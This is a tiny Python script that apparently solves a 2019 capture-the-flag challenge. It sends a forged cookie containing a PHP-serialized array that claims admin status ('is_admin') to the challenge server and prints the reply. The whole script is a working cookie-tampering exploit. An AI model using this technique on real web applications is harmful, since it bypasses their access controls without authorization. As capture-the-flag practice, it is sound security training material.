#coding=utf-8
import requests

cookies = {'user':'a:1:{s:8:"is_admin";s:9:"lambda_1";}'}
res = requests.get('http://shell1.2019.peactf.com:22541/query.php', 
  cookies = cookies)

print res.text